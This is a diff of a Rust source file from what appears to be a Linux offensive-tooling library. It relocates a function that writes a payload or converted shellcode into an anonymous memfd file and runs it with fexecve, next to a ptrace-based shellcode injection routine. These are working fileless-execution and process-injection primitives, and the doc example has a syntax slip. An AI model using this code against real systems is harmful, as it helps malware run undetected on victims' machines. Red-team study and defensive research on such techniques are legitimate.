@@ -13,6 +13,60 @@ use crate::payload::{Payload, PayloadType, Spawn};
 use crate::primitives::ptrace::ptace_write_rip;
 use crate::utils::{get_env, str_to_vec_c_string};
 
+/// Uses memfd_create to create an anonymous file in memory, writes the payload to it,
+/// and executes it. Shellcode is converted to an ELF before execution.
+///
+/// # Arguments
+/// * `payload` - A `Payload<Spawn>` containing either an executable or shellcode
+///
+/// # Errors
+/// Returns an error if:
+/// - In-memory file creation fails
+/// - Writing to in-memory file fails
+/// - Process creation fails
+///
+/// # Examples
+/// ```no_run
+/// use linc::payload::{Payload, Spawn};
+/// use linc::techniques::spawn;
+///
+/// // Execute an existing binary
+/// let payload = Payload::<Spawn>::from_file("/path/to/payload")
+///     .set_args(/* args */);
+///     .unwrap()
+///
+/// spawn::memfd(payload).unwrap();
+/// ```
+pub fn memfd(payload: Payload<Spawn>) -> Result<()> {
+    let anon_file_name = CString::new("")?;
+    let p_file_name = anon_file_name.as_c_str();
+
+    let fd = memfd_create(p_file_name, MemFdCreateFlag::MFD_CLOEXEC)?;
+
+    let bytes = match payload.payload_type() {
+        PayloadType::Executable => payload.bytes().to_vec(),
+        PayloadType::Shellcode => elf64::shellcode_to_exe(payload.bytes()),
+    };
+
+    unistd::write(&fd, &bytes)?;
+
+    let args = str_to_vec_c_string(payload.args())?;
+    let args_slice = args.as_slice();
+
+    let env = get_env()?;
+    let env_slice = env.as_slice();
+
+    match unsafe { fork() } {
+        Ok(ForkResult::Parent { child: _ }) => {}
+        Ok(ForkResult::Child) => {
+            fexecve(fd.as_raw_fd(), args_slice, env_slice)?;
+        }
+        Err(error) => return Err(Error::Linux(error)),
+    }
+
+    Ok(())
+}
+
 /// Uses ptrace to inject shellcode into a sacrificial process by overwriting its RIP register.
 /// Only works with shellcode payloads.
 ///
@@ -69,60 +123,6 @@ pub fn ptrace_overwrite_rip(payload: Payload<Spawn>) -> Result<()> {
             execve(&target_c_string, target_args_slice, env_slice)?;
         }
 
-        Err(error) => return Err(Error::Linux(error)),
-    }
-
-    Ok(())
-}
-
-/// Uses memfd_create to create an anonymous file in memory, writes the payload to it,
-/// and executes it. Shellcode is converted to an ELF before execution.
-///
-/// # Arguments
-/// * `payload` - A `Payload<Spawn>` containing either an executable or shellcode
-///
-/// # Errors
-/// Returns an error if:
-/// - In-memory file creation fails
-/// - Writing to in-memory file fails
-/// - Process creation fails
-///
-/// # Examples
-/// ```no_run
-/// use linc::payload::{Payload, Spawn};
-/// use linc::techniques::spawn;
-///
-/// // Execute an existing binary
-/// let payload = Payload::<Spawn>::from_file("/path/to/payload")
-///     .set_args(/* args */);
-///     .unwrap()
-///
-/// spawn::memfd(payload).unwrap();
-/// ```
-pub fn memfd(payload: Payload<Spawn>) -> Result<()> {
-    let anon_file_name = CString::new("")?;
-    let p_file_name = anon_file_name.as_c_str();
-
-    let fd = memfd_create(p_file_name, MemFdCreateFlag::MFD_CLOEXEC)?;
-
-    let bytes = match payload.payload_type() {
-        PayloadType::Executable => payload.bytes().to_vec(),
-        PayloadType::Shellcode => elf64::shellcode_to_exe(payload.bytes()),
-    };
-
-    unistd::write(&fd, &bytes)?;
-
-    let args = str_to_vec_c_string(payload.args())?;
-    let args_slice = args.as_slice();
-
-    let env = get_env()?;
-    let env_slice = env.as_slice();
-
-    match unsafe { fork() } {
-        Ok(ForkResult::Parent { child: _ }) => {}
-        Ok(ForkResult::Child) => {
-            fexecve(fd.as_raw_fd(), args_slice, env_slice)?;
-        }
         Err(error) => return Err(Error::Linux(error)),
     }
 
